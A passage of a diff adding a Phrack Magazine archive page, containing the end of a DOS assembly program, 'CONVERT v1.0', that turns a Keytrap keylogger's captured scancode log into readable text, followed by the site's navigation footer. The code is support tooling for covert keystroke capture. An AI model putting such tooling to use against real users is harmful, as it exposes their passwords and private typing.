+ db 0AFh, 'V'                    ;
+ db 091h, 'W'                    ;
+ db 0ADh, 'X'                    ;
+ db 095h, 'Y'                    ;
+ db 0ACh, 'Z'                    ;
+;----------------------------------------
+ db 00Ch, '-'                    ;
+ db 08Ch, '_'                    ;
+     ;
+ db 00Dh, '='                    ;
+ db 08Dh, '+'                    ;
+     ;
+ db 01Ah, '['                    ;
+ db 09Ah, '{'                    ;
+     ;
+ db 01Bh, ']'                    ;
+ db 09Bh, '}'                    ;
+     ;
+ db 027h, ';'                    ;
+ db 0A7h, ':'                    ;
+     ;
+ db 028h, 027h                   ; '
+ db 0A8h, '&quot;'                    ;
+     ;
+ db 033h, ','                    ;
+ db 0B3h, '&lt;'                    ;
+     ;
+ db 034h, '.'                    ;
+ db 0B4h, '&gt;'                    ;
+     ;
+ db 035h, '/'                    ;
+ db 0B5h, '?'                    ;
+     ;
+ db 02Bh, '\'                    ;
+ db 0ABh, '|'                    ;
+     ;
+ db 037h, '*'                    ;
+ db 0B7h, '*'                    ;
+     ;
+ db 029h, '`'                    ;
+ db 0A9h, '~'                    ;
+     ;
+;----------------------------------------
+     ;
+ db 039h, 020h                   ; space
+ db 0B9h, 020h                   ; space with shift
+     ;
+ db 00Eh, 011h                   ; backspace
+ db 08Eh, 011h                   ; backspace with shift
+     ;
+ db 01Ch, 00Ah                   ; return
+ db 09Ch, 00Ah                   ; return with shift
+     ;
+ db 0                            ; End of Table
+     ;
+;==============================================================================
+      ;
+ fprob: mov     ah, 9                           ;
+ lea     dx, ferr                        ;
+ int     21h                             ;
+ jmp     bye                             ;
+      ;
+prtuse: mov     ah, 9                           ;
+ lea     dx, usage                       ;
+ int     21h                             ;
+      ;
+   bye: mov     ah, 4Ch                         ;
+ int     21h                             ;
+      ;
+;------------------------------------------------
+      ;
+    go: mov     ah, 9                           ;
+ lea     dx, namver                      ;
+ int     21h                             ;
+      ;
+ mov     bx, 80h                         ;
+ cmp     byte ptr [bx], 0                ;
+ je      prtuse                          ;
+      ;
+ call    null                            ;
+ call    check                           ;
+ jc      fprob                           ;
+      ;
+   go1: call    ldata                           ;
+ call    conv                            ;
+ call    sdata                           ;
+ cmp     last, 1                         ;
+ jne     go1                             ;
+ jmp     bye                             ;
+      ;
+;------------------------------------------------
+      ;
+  null: mov     bx, 81h                         ;
+ null1: inc     bx                              ;
+ cmp     byte ptr [bx], 20h              ;
+ jnz     null1                           ;
+ mov     byte ptr [bx], 0                ;
+      ;
+ mov     outoffset, bx                   ;
+ inc     word ptr [outoffset]            ;
+      ;
+ null2: inc     bx                              ;
+ cmp     byte ptr [bx], 0Dh              ;
+ jnz     null2                           ;
+ mov     byte ptr [bx], 0                ;
+ ret                                     ;
+      ;
+;------------------------------------------------
+      ;
+check:  mov     ax, 3D00h                       ;
+ mov     dx, 82h                         ;
+ int     21h                             ;
+ jc      check2                          ;
+ mov     bx, ax                          ;
+ mov     ah, 3Eh                         ;
+ int     21h                             ;
+ jc      check2                          ;
+      ;
+ mov     ah, 3Ch                         ;
+ xor     cx, cx                          ;
+ mov     dx, outoffset                   ;
+ int     21h                             ;
+ jc      check2                          ;
+ mov     bx, ax                          ;
+ mov     ah, 3Eh                         ;
+ int     21h                             ;
+ jc      check2                          ;
+      ;
+ clc                                     ;
+check2: ret                                     ;
+      ;
+;------------------------------------------------
+      ;
+ ldata: mov     ax, 3D00h                       ;
+ mov     dx, 82h                         ;
+ int     21h                             ;
+ mov     inhandle, ax                    ;
+      ;
+ mov     ax, 4200h                       ;
+ mov     bx, inhandle                    ;
+ mov     cx, inpointH                    ;
+ mov     dx, inpointL                    ;
+ int     21h                             ;
+      ;
+ mov     ah, 3Fh                         ;
+ mov     bx, inhandle                    ;
+ mov     cx, 60000                       ;
+ lea     dx, eof                         ;
+ int     21h                             ;
+ mov     loaded, ax                      ;
+ cmp     ax, 60000                       ;
+ je      ldata2                          ;
+ mov     last, 1                         ;
+      ;
+ldata2: mov     ax, 4201h                       ;
+ mov     bx, inhandle                    ;
+ xor     cx, cx                          ;
+ xor     dx, dx                          ;
+ int     21h                             ;
+ mov     inpointH, dx                    ;
+ mov     inpointL, ax                    ;
+      ;
+ mov     ah, 3Eh                         ;
+ mov     bx, inhandle                    ;
+ int     21h                             ;
+ ret                                     ;
+      ;
+;------------------------------------------------
+      ;
+  conv: mov     cx, loaded                      ;
+ lea     si, eof                         ;
+      ;
+ conv1: lea     di, table                       ;
+      ;
+ cmp     cx, 0                           ;
+ je      conv6                           ;
+      ;
+ mov     al, byte ptr [si]               ;
+ conv2: mov     ah, byte ptr [di]               ;
+ cmp     ah, 0                           ;
+ je      conv4                           ;
+ cmp     ah, al                          ;
+ je      conv3                           ;
+ add     di, 2                           ;
+ jmp     conv2                           ;
+      ;
+ conv3: inc     di                              ;
+ mov     al, byte ptr [di]               ;
+ mov     byte ptr [si], al               ;
+ dec     cx                              ;
+ inc     si                              ;
+ jmp     conv1                           ;
+      ;
+ conv4: mov     byte ptr [si], 20h              ;
+ dec     cx                              ;
+ inc     si                              ;
+ jmp     conv1                           ;
+      ;
+ conv6: ret                                     ;
+      ;
+;------------------------------------------------
+      ;
+sdata:  mov     ax, 3D02h                       ;
+ mov     dx, outoffset                   ;
+ int     21h                             ;
+ mov     outhandle, ax                   ;
+      ;
+ mov     ax, 4202h                       ;
+ mov     bx, outhandle                   ;
+ xor     cx, cx                          ;
+ xor     dx, dx                          ;
+ int     21h                             ;
+      ;
+ mov     ah, 40h                         ;
+ mov     bx, outhandle                   ;
+ mov     cx, loaded                      ;
+ lea     dx, eof                         ;
+ int     21h                             ;
+      ;
+ mov     ah, 3Eh                         ;
+ mov     bx, outhandle                   ;
+ int     21h                             ;
+ ret                                     ;
+      ;
+;------------------------------------------------------------------------------
+
+namver  db 10,13
+ db 'CONVERT v1.0',10,13
+ db 'Keytrap logfile converter.',10,13
+ db 'By Dcypher (Dcypher@aol.com)',10,13
+ db 10,13,'$'
+
+usage   db 'Usage: CONVERT logfile outfile',10,13
+ db 10,13
+ db '       logfile - Keytrap',27h,'s scancode data.',10,13
+ db '       outfile - Specify an output file name.',10,13
+ db 10,13,'$'
+
+ferr    db 'WARNING: Problem with one of the files.',10,13
+ db 10,13,'$'
+
+;------------------------------------------------------------------------------
+
+eof     db 0
+ end start
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
